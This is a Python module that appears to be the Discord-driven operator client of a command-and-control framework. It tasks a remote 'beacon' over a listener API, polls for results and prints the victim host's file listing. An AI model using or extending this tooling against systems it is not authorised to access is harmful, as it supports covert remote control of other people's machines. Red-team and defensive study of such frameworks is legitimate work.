import requests
import discord
import json
import base64
import time
import asyncio
import sys
from tabulate import tabulate
from Athena.types import *

async def pretty_print_ls(files: list[File], hostname: str) -> str:
    table_data = []
    for file in files:
        file_name = file["Filename"].split("\\")[-1]
        size_in_kb = file["Size"] / 1024
        file_type = "Directory" if file["IsDir"] else "File"
        table_data.append([file_name, f"{size_in_kb:.2f}KB", file_type])

    headers = ["Filename", "Size", "Type"]

    file_table = tabulate(table_data, headers, tablefmt="plain")

    response_size = sys.getsizeof(files)

    package = f"```\n[*] {hostname} called home, sent: {response_size} bytes\n\n"
    package += f"{file_table}\n"
    package += "```"

    return package

async def send_command(task: str, url: str, uid: str):
    try:
        command_data = CommandData(CommandID="", Command=task)
        data = command_data.winton()
        res = requests.post(f"{url}/tasks/{uid}", json=data)
        if res.status_code == 200:
            return res.json()
    except Exception as e:
        print(e)

async def get_results(url: str, task_id: str, sleep: int):

    PACKAGE_START = time.time()

    while True:
        await asyncio.sleep(sleep)
        if time.time() - PACKAGE_START > 20:
            return "No results found."
        try:
            res = requests.get(f"{url}/results/{task_id}")
            if res.status_code == 200:
                return res.json()["results"]
            
            if res.json()["message"] == "No results found":
                return res.json()["message"]
        except Exception as e:
            return e
        

async def handle_command(command: str, uid: str, message: discord.message.Message, listener: str, sleep: int, hostname: str) -> (bool, str):
    match command:
        case "ls":
            await message.channel.send(f"[*] Tasked beacon to list files in .\n")
            task_req = await send_command("ls", listener, uid)
            print(f"[*] Assigned task ID: {task_req['uid']}")

            res = await get_results(listener, task_req["uid"], sleep)
            print(res)
            
            files = json.loads(base64.b64decode(res[0]["Result"]).decode())

            package = await pretty_print_ls(files, hostname)
            return True, package
        case _:
            return False, ""
             